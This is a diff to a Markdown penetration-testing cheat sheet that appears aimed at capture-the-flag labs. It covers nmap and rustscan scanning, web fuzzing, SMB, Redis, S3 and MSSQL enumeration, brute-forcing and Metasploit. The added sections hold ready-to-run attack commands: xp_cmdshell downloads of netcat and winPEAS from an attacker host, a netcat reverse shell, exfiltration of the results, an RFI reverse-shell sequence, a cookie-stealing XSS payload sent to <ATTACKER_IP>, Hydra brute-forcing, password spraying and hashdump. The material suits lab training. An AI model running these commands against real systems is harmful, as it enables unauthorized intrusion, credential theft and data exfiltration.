@@ -5,9 +5,9 @@ hidemeta: true
 ---
 # 🎯 Overview
 
-Standard penetration testing methodology:
-
 ## 📋 Methodology Phases
+
+Standard penetration testing methodology:
 
 1. **🔍 Host Discovery** - Identify live hosts and network topology
 2. **🔎 Service Scanning** - Enumerate open ports and running services  
@@ -23,21 +23,32 @@ Standard penetration testing methodology:
 - [MITRE ATT&CK](https://attack.mitre.org/) - Adversarial tactics and techniques
 - [Lockheed Martin Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html) - Original kill chain methodology
 
-## Searching
+## 🔍 Searching
 
-- Shodan.io: https://www.shodan.io/dashboard?language=en
-    - https://www.shodan.io/search/examples
-- Censys
-    - https://docs.censys.com/docs/ls-introductory-use-cases#/
-- Advanced Search Operators: https://github.com/cipher387/Advanced-search-operators-list?tab=readme-ov-file#socialmedia
+- **Shodan.io**: https://www.shodan.io/dashboard?language=en
+  - https://www.shodan.io/search/examples
+- **Censys**: https://docs.censys.com/docs/ls-introductory-use-cases#/
+- **Advanced Search Operators**: https://github.com/cipher387/Advanced-search-operators-list?tab=readme-ov-file#socialmedia
 
 # 🔍 Host Discovery
 
 Host discovery is the first phase of network reconnaissance, focused on identifying live hosts within a target network.
 
+## 🚀 RustScan
+
+RustScan **(`-sT` or TCP full-connect only!)** finds targets and open ports quickly and feeds that into `nmap` for stronger scanning. A host discovery command that would take `nmap` minutes will only take `rustscan` seconds.
+
+```bash
+# Just top 100
+sudo rustscan --scan-order "Random" -a <TARGET> -- -oA $(date +%Y-%m-%d_%H%M)_rustscan --top-ports 100
+
+# Noisy but quick; -A = -sC -sV -O --traceroute
+sudo rustscan --no-banner -u $(ulimit -Hn) -b 65535 -t 2000 --scan-order "Random" -r 1-65535 -a <TARGET> -- -oA $(date +%Y-%m-%d_%H%M)_rustscan -A
+```
+
 ## 🗺️ NMAP: `-P*`
 
-Nmap is the industry-standard network discovery and security auditing tool.
+`Nmap` is the industry-standard network discovery and security auditing tool.
 
 **References:**
 - [Nmap Manual](https://linux.die.net/man/1/nmap)
@@ -57,7 +68,7 @@ Filtering out live hosts for `-iL`:
 
 ```bash
 # Find and save live hosts
-sudo nmap -sn -oA host_disc
+sudo nmap -sn -oA $(date +%Y-%m-%d_%H%M)_host_disc
 
 # Strip out live hosts
 grep 'Status: Up' *.gnmap | awk '{print $2}' > live_hosts.txt
@@ -69,7 +80,7 @@ sudo nmap -sn -iL live_hosts.txt
 
 - `-n`: Do **NOT** try to reverse-DNS lookup hosts
 - `-R`: Do try to reverse-DNS lookup hosts, even offline ones
-    - Use `--dns-servers` to specify the DNS server
+  - Use `--dns-servers` to specify the DNS server
 
 ### 🎯 Default Probes
 
@@ -83,7 +94,7 @@ These are run in parallel:
 ### 🔗 ARP: -PR
 
 - Works on local networks only (checked via routing table and network interfaces with subnet match)
-- VERY reliable
+- Very reliable
 - Force ARP `-PR` vs. force IP-only `--send-ip`
   - e.g., `sudo nmap -PR -sn <TARGET>` will do only ARP pings on the local network 
 
@@ -147,44 +158,6 @@ By default, `nmap` scans the top 1,000 ports. `-F` scans top 100 instead (equiva
 - filtered: nothing or FAKE RST received
 - closed: RST received
 
-### 🚫 Malformed Scans (Negative Tests)
-
-Typically, malformed scans are useful as follow-up scans (after a -sT/-sS/-sU) because the OS can be fingerprinted. If everything is "filtered" (i.e., no response), these scans might reveal more information (assuming no modern firewall or IDS is present -- **works best for stateless firewalls**).
-
-These can be thought of as negative scans since responses are normally only sent/received when the port is **closed**. Open ports cannot be confirmed with these types of scans alone. However, any traffic from a host can be used for host discovery rather than enumeration.
-
-| OS / Device        | Behavior with malformed TCP packets (NULL/FIN/Xmas) | Notes |
-|--------------------|-----------------------------------------------------|-------|
-| **Unix/Linux (RFC-compliant)** | - **Open port** → No response<br>- **Closed port** → RST sent | Matches RFC 793, used by Nmap to infer open vs. closed ports |
-| **Windows (all modern versions)** | Always sends RST, regardless of port state | Breaks RFC; all ports appear **closed** during NULL/FIN/Xmas scans |
-| **Cisco devices** | Typically send RST to any malformed packet | Similar to Windows; non-RFC-compliant |
-| **IBM OS/400 & some others** | Respond with RST to all malformed probes | Causes false “closed” results |
-| **Firewalls / IDS/IPS** | Often drop malformed probes silently | Can cause ports to appear **filtered** instead |
-
-**Ignoring** the information from the table above, the following scans all have the same **generalized** outcomes except where noted:
-
-| State           | Description                      |
-| :-------------- | :------------------------------- |
-| `Open/Filtered` | No response or firewalled        |
-| `Filtered`      | ICMP "Port Unreachable" received |
-| `Closed`        | `RST`  received                  |
-
-#### 🚫 Null: `-sN` (FW evasion)
-
-TCP scan with **no** TCP flags set
-
-#### 🚫 Fin: `-sF` (FW evasion)
-
-TCP scan with **only** FIN flag set; FIN is meant to gracefully close a session
-
-#### 🚫 Xmas: `-sX` (FW evasion)
-
-TCP scan with **all** FIN/PSH/URG flags set
-
-#### 🚫 Maimon: `-sM` (Obsolete)
-
-TCP scan with FIN/ACK. **Note:** This scan is mostly useless since a RST packet should always be sent. This was only contrary and therefore useful for BSD systems in the 90s, which would sometimes drop packets for open ports.
-
 #### 🔍 ACK: `-sA` (FW rule scan)
 
 TCP scan with ACK. This scan is useful to **map out firewall rules**.
@@ -194,33 +167,27 @@ TCP scan with ACK. This scan is useful to **map out firewall rules**.
 | **Unfiltered** | `RST` packet received. The port is **accessible**, indicating it's not blocked by a firewall. But *Nmap cannot tell if the port is open or closed* |
 | **Filtered**   | The port is **not accessible**, meaning a firewall or other security device is blocking the ACK probe. This indicates that the port is filtered.   |
 
-#### 🚫 Window: `-sW` (FW rule scan)
+#### **Malformed "Stealth" Scans (-sN, -sF, -sX)**
 
-TCP scan that examines the window sizes of the response packets. Mostly, it is **unreliable** although it is used for FW rules.
+These scans are used to bypass simple, stateless firewalls or an IDS that is only configured to detect standard SYN packets. They work by sending non-standard TCP packets. RFC-compliant systems (like Linux) will only send a response (a TCP RST packet) if the port is **closed**. If the port is open, they send no response at all.
 
-| State        | Description                                                                          |
-| :----------- | :----------------------------------------------------------------------------------- |
-| `Closed`     | `RST` packet received with non-zero TCP window size. The port is **closed**          |
-| `Filtered`   | No response. The port is filtered by a firewall                                      |
-| `Unfiltered` | This port is not blocked by a firewall, but whether it is open or closed is unknown. |
+**Critical Note:** These scans are ineffective against modern Windows systems, which do not follow the RFC and send a RST packet regardless of whether the port is open or closed.
 
-#### 🚫 Zombie/Idle/Anonymous Scan: `-sI` (Obsolete)
+**Scan Definitions & Use Case**
 
-A stealthy TCP scan that uses a third-party "zombie" host to scan a target on the attacker's behalf. It is **unreliable** and **obsolete** for modern systems.
+| Option | Scan Name | Description / Flags Set | Primary Use Case & Key Limitation |
+| :--- | :--- | :--- | :--- |
+| `-sN` | **NULL Scan** | No flags are set. | **Firewall Evasion:** Slips past firewalls that only check for SYN packets. **Limitation:** Does NOT work on Windows. |
+| `-sF` | **FIN Scan** | Only the FIN flag is set. | **Firewall Evasion:** Same purpose as the NULL scan, just a different probe. **Limitation:** Does NOT work on Windows. |
+| `-sX` | **Xmas Scan** | The FIN, PSH, and URG flags are set. | **Firewall Evasion:** Same purpose, but "louder" and more likely to be logged. **Limitation:** Does NOT work on Windows. |
 
-|State|Description|
-|---|---|
-|`Open`|The IP ID of the zombie host increments by 2, indicating the target port is open.|
-|`Closed`|The IP ID of the zombie host increments by 1, indicating the target port is closed.|
-|`Filtered`|The IP ID of the zombie host increments by 1, indicating the target port is filtered.|
+**How Nmap Interprets the Results**
 
-```
-# MANDATORY: See if host uses incremental IP ID
-nmap --script ipidseq -p <OPEN_PORT> <ZOMBIE_IP>
-
-# Scan
-nmap -Pn -sI <ZOMBIE_IP> <TARGET_IP>
-```
+| Nmap State      | Network Response Received      | Likely Meaning for RFC-Compliant Targets (e.g., Linux)               |
+| :-------------- | :----------------------------- | :------------------------------------------------------------------- |
+| `open/filtered` | **No response.**               | The port is **open**, or a stateful firewall is dropping the packet. |
+| `closed`        | A **TCP RST** packet.          | The port is **closed**.                                              |
+| `filtered`      | An **ICMP Unreachable** error. | A router or firewall is actively rejecting the packet.               |
 
 ### 🥷 Network Evasion Techniques
 
@@ -312,43 +279,16 @@ nmap --script-updatedb
 ### 💡 Example Scans
 
 ```bash
-# Service Versioning; Note: establishes full TCP connection
-sudo nmap -n -Pn -sV <TARGET>
-
-# OS Guess
-sudo nmap -n -Pn -O <TARGET>
-
-# Traceroute
-sudo nmap -n -Pn -sn --traceroute <TARGET>
-
-# Comprehensive scan with scripts, versioning, and OS detection
-sudo nmap -Pn -n -sC -sV -O -T4 -oA nmap_scan <target_ip>
-
-# Basic SYN scan against the top 5000 ports
-sudo nmap -Pn -sS -p-5000 -oA syn_scan <target_ip>
-
-# TCP connect scan against a single port (e.g., 80)
-sudo nmap -Pn -sT -p 80 -oA tcp_conn_80 <target_ip>
-
-# Xmas scan, assuming host is up, on the first 999 ports
-sudo nmap -Pn -sX -p-999 -oA xmas_scan <target_ip>
-
-# ICMP echo ping scan to check if a host is up
-sudo nmap -sn -PE <target_ip>
-
-# TCP SYN ping on port 443 to check if a host is up
-nmap --disable-arp-ping -PS <target_ip>
-
 # Check for anonymous FTP login
-sudo nmap -Pn --script ftp-anon <target_ip>
+sudo nmap -Pn --script ftp-anon <TARGET>
 
 # Scan SMB ports for information and vulnerabilities
-nmap -p 137,139,445 --script nbstat,smb-os-discovery,smb-enum-shares,smb-enum-users <target_ip>
+sudo nmap -n -Pn -p 137,139,445 --script nbstat,smb-os-discovery,smb-enum-shares,smb-enum-users <TARGET>
 
 # Advanced Scans
-nmap -sS -p53 <NETBLOCK>
-nmap -sU -p53 <NETBLOCK>
-nmap -Pn -n -sS -sV \
+sudo nmap -sS -p53 <NETBLOCK>
+sudo nmap -sU -p53 <NETBLOCK>
+sudo nmap -n -Pn -sS -sV \
   --max-retries 1 \
   --host-timeout 45s \
   --initial-rtt-timeout 300ms \
@@ -359,17 +299,11 @@ nmap -Pn -n -sS -sV \
 # whois
 nmap -n -Pn -sn --script whois-domain <TARGET_DOMAIN>
 
-# Discovers the operating system, computer name, and domain of a target 
-# via the SMB protocol.
-nmap -p 445 --script smb-os-discovery <TARGET>
-
-#### SMB Share Enumeration
-```bash
 # Attempts to list available SMB shares on the target
 nmap -p 445 --script smb-enum-shares <TARGET>
 ```
 
-#### Additional Service Scans
+#### 🔍 Additional Service Scans
 ```bash
 # DNS service discovery
 sudo nmap -sU -Pn -n -p 53 --script=dns-recursion,dns-service-discovery <TARGET>
@@ -395,6 +329,54 @@ sudo nmap -sU -Pn -n -p 1900 --script=ssdp-discover <TARGET>
 
 # IKE version detection
 sudo nmap -sU -Pn -n -p 500 --script=ike-version <TARGET>
+```
+
+### 🔍 `ffuf` Fuzzing
+
+```bash
+# --- 1. DIRECTORY & FILE DISCOVERY ---
+
+# Basic Directory Fuzzing
+ffuf -s -c -o ffuf_dirs -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:DIR -u http://$TARGET/DIR
+
+# Basic File Fuzzing
+ffuf -s -c -o ffuf_files -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt:FILE -u http://$TARGET/FILE
+
+# File Fuzzing with Specific Extensions
+ffuf -s -c -o ffuf_files_ext -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt:FILE -e .php,.txt,.html -u http://$TARGET/FILE
+
+# --- 2. ADVANCED FILTERING ---
+
+# Filter responses BY HTTP STATUS CODE
+ffuf -s -c -o ffuf_filter_code -w FUZZ -u http://$TARGET/FUZZ -mc 200,301,302 -fc 403
+# careful 403 could indicate files that we cant access atm
+
+# Filter responses BY RESPONSE SIZE
+ffuf -s -c -o ffuf_filter_size -w FUZZ -u http://$TARGET/FUZZ -fs 0
+
+# Filter responses BY REGEX
+# This example finds any file/dir starting with a dot (e.g., .git, .env)
+ffuf -s -c -o ffuf_filter_regex -w FUZZ -u http://$TARGET/FUZZ -mr '/\..*'
+
+# --- 3. PARAMETER & VALUE DISCOVERY ---
+
+# Discover GET Parameter Names
+ffuf -s -c -o ffuf_get_params -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -u 'http://$TARGET/index.php?PARAM' -fw 39
+
+# Fuzz GET Parameter Values
+# This example fuzzes the 'id' parameter with numbers from 0 to 255
+for i in {0..255}; do echo $i; done | ffuf -s -c -o ffuf_param_values -w -:PARAM_VAL -u 'http://$TARGET/index.php?id=PARAM_VAL' -fw 33
+
+# Fuzz POST Data / Logins (ONLINE - use small wordlist to avoid lockouts)
+ffuf -s -c -o ffuf_post_logins -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt:PASSWORD -u http://$TARGET/login.php -X POST -d 'user=<USERNAME>&pass=PASSWORD' -H 'Content-Type: application/x-www-form-urlencoded' -fs 1435
+
+# --- 4. SUBDOMAIN & VHOST DISCOVERY ---
+
+# Subdomain Fuzzing
+ffuf -s -c -o ffuf_subdomains -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:SUBDOMAIN -u http://SUBDOMAIN.<DOMAIN>
+
+# Virtual Host (VHost) Fuzzing
+ffuf -s -c -o ffuf_vhosts -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:VHOST -u http://$TARGET -H 'Host: VHOST.<DOMAIN>'
 ```
 
 ## 🌐 DNS
@@ -430,17 +412,43 @@ dig @<DNS_SERVER> +noedns +nocookie +norecurse <TARGET>
 # EDNS breaks on Win, norecurse usu for internal networks
 ```
 
+## 📁 FTP
+
+```bash
+# Connect to FTP server in passive mode with anonymous login
+ftp -p -a <HOST>
+# Username: anonymous
+# Password: (no password required)
+
+# List files and directories
+ls
+
+# Download files
+get <FILENAME>
+
+# Execute local commands (outside of FTP session)
+!<COMMAND>
+```
+
 ## 🏢 SMB / LDAP / Kerberos
 
 ```bash
 # Perform a full enumeration of a target using enum4linux
 enum4linux -a <TARGET>
 
-# List available SMB shares for a given host
-smbclient -L //<TARGET>/ -U <USERNAME>
+# List available SMB shares without password
+smbclient -N --list <HOSTNAME>
 
 # Connect to an SMB share with a null session (no password)
 smbclient -N //<TARGET>/<SHARE>
+
+# Connect to SMB share with password
+smbclient --password=<PASSWORD> '\\<HOSTNAME>\<SHARE>'
+
+# SMB commands once connected:
+ls                    # List files
+get <FILE>           # Download file
+recurse              # Toggle directory recursion
 
 # SMB enumeration:
 sudo nmap -p 445 --script "smb-enum-domains,smb-os-discovery" <TARGET>
@@ -453,6 +461,77 @@ sudo nmap -p 389 --script ldap-search --script-args 'ldap.search.base="",ldap.se
 dig @<TARGET> SOA
 ```
 
+### 📂 SMB Administrative Shares
+
+- **ADMIN$** - Administrative shares are hidden network shares created by the Windows NT family of operating systems that allow system administrators to have remote access to every disk volume on a network-connected system. These shares may not be permanently deleted but may be disabled.
+- **C$** - Administrative share for the C:\ disk volume. This is where the operating system is hosted.
+- **IPC$** - The inter-process communication share. Used for inter-process communication via named pipes and is not part of the file system
+
+## 🗄️ Redis
+
+```bash
+# Connect to Redis server
+redis-cli -h <IP_ADDRESS>
+
+# Redis commands:
+INFO                    # Get server information
+CONFIG GET databases    # Get database configuration
+INFO keyspace          # Get keyspace information
+SELECT <DB_INDEX>       # Select database by index
+KEYS *                  # List all keys
+GET flag               # Get value for 'flag' key
+```
+
+## ☁️ AWS
+
+```bash
+# Install AWS CLI
+sudo apt install -y awscli
+
+# Configure AWS CLI (must provide values even if not used)
+aws configure
+
+# List S3 buckets using custom endpoint
+aws --endpoint=<S3_URL> s3 ls
+
+# List contents of specific S3 bucket
+aws --endpoint=<S3_URL> s3 ls s3://<DOMAIN>
+
+# Upload file to S3 bucket
+aws --endpoint=<S3_URL> s3 cp <FILE> s3://<DOMAIN>
+```
+
+## 🖥️ MSSQL
+
+```bash
+# Connect to MSSQL server using impacket
+/usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth '<DOMAIN>/<USER>:<PASSWORD>@<IP_ADDRESS>'
+
+# MSSQL commands:
+select @@version;                    # Get SQL Server version
+
+# Enable xp_cmdshell for command execution
+enable_xp_cmdshell
+
+# Execute commands via xp_cmdshell
+xp_cmdshell "powershell.exe -exec bypass -c wget http://10.10.14.190:8000/nc64.exe -outfile ../../Users/<USER>/Desktop/nc64.exe"
+
+# Set up listener for reverse shell
+nc -lvnp 443
+
+# Execute reverse shell
+xp_cmdshell "powershell.exe -exec bypass -c ../../Users/<USER>/Desktop/nc64.exe -e cmd.exe <CALLBACK_IP> 443"
+
+# Download and run winPEAS for privilege escalation
+cd ~/Downloads/ && python3 -m http.server 8000 &
+xp_cmdshell "powershell.exe -exec bypass -c wget http://<CALLBACK_IP>:8000/winPEASx64.exe -outfile ../../Users/<USER>/Desktop/winPEASx64.exe"
+xp_cmdshell "powershell.exe -exec bypass ../../Users/<USER>/Desktop/winPEASx64.exe > ../../Users/<USER>/Desktop/winPEASx64.txt"
+
+# Transfer results back
+nc -nvlp 444 > winPEASx64.txt
+xp_cmdshell "powershell.exe -exec bypass -c ../../Users/<USER>/Desktop/nc64.exe <CALLBACK_IP> 444 < ../../Users/<USER>/Desktop/winPEASx64.txt"
+```
+
 ## 🌍 Web
 
 ### 🦊 Browser-based Reconn (Firefox)
@@ -462,27 +541,66 @@ dig @<TARGET> SOA
 - Techs used by website: https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
 - Developer Tools: F12
 
-### 🔍 Gobuster
+- JavaScript Obfuscator: https://codebeautify.org/javascript-obfuscator
+- JavaScript Deobfuscator: https://obf-io.deobfuscate.io/
+
+### 🔍 Web Technology Detection
+
+```bash
+# Enumerates web server + version + OS + frameworks + JS libraries
+whatweb --aggression 3 <TARGET>
+
+# Command-line web vulnerability scanner
+wapiti --url <TARGET>
+```
+
+### 🔍 Webserver Dirs
 
 ```bash
 # Directory brute-force with a common wordlist
-gobuster dir --threads 20 --wordlist /usr/share/wordlists/dirb/common.txt --url <TARGET>
+gobuster --quiet --threads 64 --output gobuster_dir_common dir --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --url <TARGET>
 
 # Directory brute-force using a larger wordlist and showing expanded URLs
-gobuster dir --output gobuster --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --url <TARGET>
+gobuster --quiet --threads 64 --output gobuster_dir_medium dir -r -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u <TARGET>
 ```
 
-### 🔍 Wpscan
+### 🌐 Subdomains
+
+```bash
+gobuster --quiet --threads 64 --output gobuster_dns_top5000 dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -d <DOMAIN>
+```
+
+### 🌐 Virtual Hosts
+
+```bash
+gobuster --quiet --threads 64 --output gobuster_vhost_top5000 vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320 --domain <DOMAIN> -u "http://<TARGET>"  # uses IP addr
+```
+
+#### 🔍 Wpscan
 
 ```bash
 # Enumerate Wordpress users
-wpscan --url http://<USER>/ --enumerate u
+wpscan --enumerate u --url http://<USER>/
 
 # Brute-force creds
-2025-08-19 18:26:03 -- wpscan --url http://<TARGET>/ --passwords <PASSWORDS_FILE> --usernames <USERS_FILE> --password-attack wp-login
+wpscan --password-attack wp-login --passwords <PASSWORDS_FILE> --usernames <USERS_FILE> --url http://<TARGET>/
 ```
 
-### 🔤 URL Encode/Decode String
+#### 🌐 cURL
+```bash
+# Fetch only the HTTP headers of a webpage
+curl -I <TARGET>
+
+# Attempt to upload a file to a web server
+curl --upload-file <FILE> <TARGET>/<FILENAME>
+
+curl -X POST \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -d "PARAM1=VALUE&PARAM2=VALUE" \
+     http://<TARGET>
+```
+
+#### 🔤 URL Encode/Decode String
 
 ```bash
 # Encode
@@ -491,20 +609,29 @@ echo '<DATA>' | python3 -c 'import urllib.parse, sys; print(urllib.parse.quote(s
 echo '<DATA>' | python3 -c 'import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read()))'
 ```
 
-### 🌐 Interacting with Web Servers using cURL
-```bash
-# Fetch a webpage's content to standard output
-curl -o- <TARGET>
+### Web Hacking
 
-# Fetch only the HTTP headers of a webpage
-curl -I <TARGET>
-
-# Attempt to upload a file to a web server
-curl --upload-file <PHP_FILE> <TARGET>/<FILENAME>
-
-# Execute a command via a webshell parameter, ensuring the command is URL encoded
-curl -o- 'http://<TARGET>/uploads/shell.phtml?cmd=ls%20-la'
-```
+| Vulnerability Type                 | Identification / Enumeration                                                                                                                                                                                                       | Exploitation / Commands                                                                                                                                                                                                                                      |
+| :--------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **1. Recon & Content Discovery**   |                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                              |
+| Initial Reconnaissance             | Check `robots.txt` & `sitemap.xml`. Inspect HTTP headers for server info and flags. Use a browser plugin or online tool (Wappalyzer) to identify the web stack (framework, CMS, etc.).                                             | `curl -v http://<TARGET>/robots.txt` <br> `curl -I http://<TARGET>`                                                                                                                                                                                          |
+| Directory / File Fuzzing           | Use a wordlist to discover hidden files and directories. Look for revealing names like `dev.log`, `admin`, `private`, `backup.zip`.                                                                                                | `gobuster dir -u http://<TARGET>/ -w <WORDLIST>` <br> `ffuf -w <WORDLIST>:FUZZ -u http://<TARGET>/FUZZ`                                                                                                                                                      |
+| Subdomain / VHost Fuzzing          | Check Certificate Transparency logs. Use Google Dorks. Fuzz for subdomains by altering the URL, and for Virtual Hosts (VHosts) by altering the `Host` header.                                                                      | `https://crt.sh/?q=%.<DOMAIN>` <br> `site:*.domain.com -site:www.domain.com` <br> `ffuf -w <WORDLIST>:FUZZ -u http://FUZZ.<DOMAIN>` <br> `ffuf -w <WORDLIST>:FUZZ -u http://<TARGET> -H 'Host: FUZZ.<DOMAIN>'`                                               |
+| **2. Authentication & Fuzzing**    |                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                              |
+| Username Enumeration               | On a sign-up or login form, fuzz the username field and look for a specific error message that indicates a user already exists (e.g., "username already exists").                                                                  | `ffuf -w <USER_LIST>:FUZZ -X POST -d "username=FUZZ&..." -H "Content-Type: ..." -u <URL> -mr "username already exists"`                                                                                                                                      |
+| Password Brute-Force               | On a login form, use a list of known usernames and common passwords to attempt to log in. Filter out failed login attempts (e.g., by response code or size).                                                                       | `ffuf -w <USER_LIST>:W1,<PASS_LIST>:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: ..." -u <LOGIN_URL> -fc <HTTP_CODE_FOR_FAIL>`                                                                                                                  |
+| Cookie Tampering                   | Inspect cookies in Burp or browser dev tools. Look for human-readable values like `admin=false`, `userID=123`, or `logged_in=no`.                                                                                                  | Modify the cookie values and resend the request. <br> `curl -H "Cookie: logged_in=true; admin=true" http://<TARGET>/admin`                                                                                                                                   |
+| **3. Server-Side Attacks**         |                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                              |
+| Local File Inclusion (LFI)         | Look for parameters that include local files (e.g., `?page=about.php`, `?file=user.txt`). Test with directory traversal payloads.                                                                                                  | `curl http://<TARGET>/page.php?file=../../../../etc/passwd` <br> `curl -o- <URL>/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts` <br> (Old PHP) Use a null byte to bypass extension appending: `.../etc/passwd%00`                                                                                                                |
+| Remote File Inclusion (RFI)        | Identify a parameter that accepts a URL. The server will fetch and execute/render the content from that URL.                                                                                                                       | **1. Host Payload:** `cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php` (edit IP/port). <br> **2. Serve Payload:** `python3 -m http.server 80` <br> **3. Trigger Exploit:** `curl http://<TARGET>/page.php?file=http://<ATTACKER_IP>/shell.php` |
+| Server-Side Request Forgery (SSRF) | Look for parameters that fetch data from another URL (e.g., `?image_url=`, `?server=`).                                                                                                                                            | Manipulate the URL to make the server request internal resources. <br> `http://<TARGET>/item?server=127.0.0.1/admin` <br> `.../item?server=metadata.internal/latest/credentials`                                                                             |
+| **4. Client-Side Attacks (XSS)**   |                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                              |
+| Cross-Site Scripting (XSS)         | Test every input field with basic payloads. Use a polyglot for complex filtering. The goal is often to steal admin cookies.                                                                                                        | **Simple Test:** `<script>alert(1)</script>` <br> **Cookie Stealing Payload:** `<script>fetch('http://<ATTACKER_IP>:<PORT>/?c=' + btoa(document.cookie));</script>`                                                                                          |
+| **5. SQL Injection (SQLi)**        |                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                              |
+| SQLi Identification                | Append a single quote (`'`) to parameters and look for a database error or a change in the page content. For blind SQLi, inject a time-delay function.                                                                             | `http://<URL>?id=1'` <br> `...id=1' AND SLEEP(5)-- -`                                                                                                                                                                                                        |
+| Union-Based SQLi                   | **1. Find Column Count:** `...id=1' ORDER BY 1-- -`, `...ORDER BY 2-- -`, etc. <br> **2. Extract Data:** `...id=0' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -` |                                                                                                                                                                                                                                                              |
+| **6. Other Vulnerabilities**       |                                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                              |
+| Race Condition                     | Identify functionality with a limited resource (e.g., "first 100 users get a discount", "one vote per user").                                                                                                                      | Use Burp Suite Repeater. Send one request to Repeater, create a tab group with many copies, and send the group in parallel to bypass the logic checks.                                                                                                       |
 
 # ⚡ Gain Access/Exploit
 
@@ -528,18 +655,46 @@ searchsploit "<SERVICE_VERSION>" | grep -iE 'remote|rce|privilege|lpe|code execu
 ```
 - https://nvd.nist.gov/vuln/search#/nvd/home
 
+## 🔓 Cracking Passwords
+
+Use context and examples like below to ascertain the hashing algorithm:
+- https://hashcat.net/wiki/doku.php?id=example_hashes
+
+Hashes ID:
+- https://hashes.com/en/tools/hash_identifier
+
+Crack hashes:
+- https://crackstation.net/
+- https://hashes.com/en/decrypt/hash
+
+```bash
+# Also read:
+man 5 crypt
+
+# Spotty: but IDs hashes
+hashid '$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1'
+```
+
 ## 💥 Brute-Forcing
 
 ### 🔨 Brute-Forcing Web & SSH Logins with Hydra
 ```bash
-# Brute-force a web login form
-hydra -t 16 -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+# Web Login brute-force (ONLINE - use small wordlist to avoid lockouts)
+hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 
-# Brute-force a Wordpress login form with a complex request string
-hydra -t 16 -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username' -V
+# Wordpress brute-force login form with a complex request string (ONLINE - use small wordlist)
+hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The%20password%20you%20entered%20for%20the%20username' -V
 
-# Brute-force an SSH login for a specific user; -t 4 is recommended for SSH
-hydra -t 4 -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET>:<PORT>
+# SSH brute-force; -t 4 is recommended for SSH (ONLINE - use small wordlist)
+hydra -t 4 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ssh://<TARGET>:<PORT>
+```
+
+### 🔨 SMB Password Spraying with CrackMapExec
+
+Use crackmapexec to spray one password against a list of users. Stealthier and avoids lockouts.
+
+```bash
+crackmapexec smb -u users.txt -p '<PASSWORD>' <TARGET_IP>
 ```
 
 ## 🎯 Metasploit / Meterpreter
@@ -549,18 +704,25 @@ hydra -t 4 -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET>:<PORT>
 # Search for exploits related to a specific keyword
 search type:exploit <KEYWORD>
 
-# Set the target host(s) for the exploit
+# TARGET
 setg RHOSTS <TARGET>
 setg PORT
 
-# Set the payload for the exploit
-set payload php/meterpreter/bind_tcp
+# PAYLOAD (callbacks usually best)
+set payload php/meterpreter/reverse_tcp
+setg LHOST
+setg LPORT
 
 # Run the configured exploit
 run
+
+# Windows Post-Exploit
+use post/windows/gather/enum_logged_on_users
+getuid
+getprivs
 ```
 
-### 📊 Survey
+### 📊 Meterpreter Survey
 
 ```bash
 sysinfo
@@ -569,10 +731,17 @@ getpid
 ipconfig
 ps
 
-search -f flag.txt
-search -f user.txt
-search -f root.txt
-# REMEMBER: quyoting and double slashes 
+# Linux flag search
+search -d / -f flag.txt
+search -d / -f user.txt
+search -d / -f root.txt
+
+# Windows flag search
+search -d C:\\ -f flag.txt
+search -d C:\\ -f user.txt
+search -d C:\\ -f root.txt
+
+# REMEMBER: for Windows, quoting and double slashes 
 cat "C:\\Programs and Files (x86)\\"
 
 hashdump  # CrackStation
@@ -586,12 +755,13 @@ run post/windows/gather/checkvm
 run post/windows/gather/enum_applications
 run post/windows/gather/enum_logged_on_users
 run post/windows/gather/enum_shares
+
 # --- Privilege Escalation & Credential Gathering ---
 run post/windows/gather/smart_hashdump
 run post/multi/recon/local_exploit_suggester
 ```
 
-### DB for Targets
+### 🗄️ DB for Targets
 
 ```bash
 # Check database status from within msfconsole
@@ -605,11 +775,11 @@ workspace <name>
 workspace -h
 
 # Database Backend Commands
